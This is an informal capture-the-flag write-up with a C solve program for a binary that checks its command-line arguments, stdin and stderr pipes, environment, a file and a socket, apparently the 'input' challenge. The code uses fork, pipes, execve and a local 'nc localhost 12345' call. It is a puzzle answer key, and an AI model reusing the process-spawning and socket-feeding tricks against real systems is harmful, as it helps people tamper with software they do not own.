### Input

#### Magic C code (my first expoit in c .... it has a reason  )

This ques was pretty good ....

Stage 1 : command line argument

1) i learnt that command line argumnets are arry of char pointers (char *argv[100]) i.e hold array of strings  
2) python and pwntools wasunable to pass "\x00" null char as cli , but we can use execve func in c to set this

stage 2 : stdio 

1) after executing execve i was unable to pass input to stdio
2) it was expecting input fron stderr too 
3) then c pipes came in handy 
4) you have to map stdin,stderr to pipe stdin 
5) fork a child and execve there and in parent process wrtie data into the pipe

stage 3 : env

in same maner as 1 us can pass env var via execve call


stage 4 : socket

use system cmd to pass value to socket

```
#include <unistd.h>
#include<stdio.h>
#include<stdlib.h>

void main()
{

char *argv[101] = {[0 ... 98]="\x00"};  
char *env[2]={"\xde\xad\xbe\xef=\xca\xfe\xba\xbe"};  					
argv['A'] = "\x00";  
argv['B'] = "\x20\x0a\x0d"; 
argv['C'] = "12345" ;
argv[99] = "\x00" ;
//execve("./test", argv,NULL);


	FILE *fp = fopen("\x0a", "w");
	fwrite("\x00\x00\x00\x00", sizeof(char), 4, fp);
	fclose(fp);

	fp = fopen("deadbeef", "w");
	fwrite("\xde\xad\xbe\xef", sizeof(char), 4, fp);
	fclose(fp);

	int p0[2], p1[2];
	pipe(p0);
	pipe(p1);

	pid_t pid;
	if ((pid = fork()) == -1) {
		puts("fork fail");
		
	}

	if (pid == 0) {
		//child
		

		//redirect pipe
		dup2(p0[0], 0);
		dup2(p1[0], 2);
	

		execve("./input", argv, env);
	} 
        
        else {
		//parent
		

		write(p0[1], "\x00\x0a\x00\xff", 4);
		write(p1[1], "\x00\x0a\x02\xff", 4);

		system("cat deadbeef | nc localhost 12345");
	}



}

```
